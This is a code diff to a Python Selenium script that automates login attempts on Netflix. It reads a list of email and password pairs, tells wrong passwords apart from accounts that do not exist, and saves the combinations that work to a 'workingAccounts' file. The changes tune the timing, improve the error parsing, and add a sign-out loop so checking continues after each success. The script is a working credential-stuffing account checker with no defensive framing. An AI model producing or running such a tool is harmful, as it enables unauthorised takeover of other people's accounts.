@@ -43,12 +43,12 @@ def netflix():
     rejectCookies.click()
     log("cookies rejected")
     signIn = driver.find_element_by_link_text("Sign In")
-    time.sleep(1)
+    time.sleep(2)
     signIn.click()
     time.sleep(1)
     fileTime = datetime.datetime.now()
     fileName = ("workingAccounts/" + "Netflix_" +
-                fileTime.strftime("%Y-%m-%d_%H:%M:%S") + ".txt")
+                fileTime.strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
     credentials = read()
     for acc in credentials:
         time.sleep(1)
@@ -64,23 +64,30 @@ def netflix():
         emailInput.send_keys(email)
         passInput.send_keys(password)
         logIn.click()
-        time.sleep(5)
+        time.sleep(1)
         try:
-            WebDriverWait(driver, 3).until(
+            WebDriverWait(driver, 1).until(
                 EC.presence_of_element_located((
-                    By.LINK_TEXT, 'create a new account'))
+                    By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'))
             )
-            log("Account " + acc + " doesn't exist")
+            error = driver.find_element_by_xpath(
+                '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]')
+            dn = error.get_attribute("innerHTML").split('"')[1]
+            if dn == "/loginHelp":
+                log("Wrong password for " + acc)
+            elif dn == "/":
+                log("Account " + acc + " doesn't exist")
+            else:
+                log("Couldn't sign in for unknown reasons with " + acc)
             continue
         except:
-            try:
-                WebDriverWait(driver, 3).until(
-                    EC.presence_of_element_located((
-                        By.LINK_TEXT, 'reset your password.'))
-                )
-                log("Wrong password for " + acc)
-            except:
-                log("Password working for " + acc)
-                accLog(acc, fileName)
-                # now if you find working account it will just stop
-                # todo this shit
+            logout = driver.find_element_by_link_text("Sign Out")
+            log("Password working for " + acc)
+            accLog(acc, fileName)
+            logout.click()
+            goNow = driver.find_element_by_link_text("Go now")
+            goNow.click()
+            signIn = driver.find_element_by_link_text("Sign In")
+            signIn.click()
+    driver.close()
+    log("closing webdriver")
